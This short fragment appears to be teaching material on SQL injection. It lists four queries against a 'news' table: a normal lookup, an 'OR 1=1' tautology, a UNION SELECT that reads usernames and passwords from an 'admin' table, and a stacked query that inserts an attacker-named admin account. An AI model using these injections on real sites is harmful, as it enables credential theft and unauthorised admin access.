SELECT * FROM news WHERE id_news = 5

SELECT * FROM news WHERE id_news = -1 OR 1=1

SELECT id_news, header, body, author FROM news WHERE id_news = -1
  UNION SELECT 1,username,password,1 FROM admin

SELECT * FROM news WHERE id_news = 12;
INSERT INTO admin (username, password) VALUES ('HaCkEr', 'foo');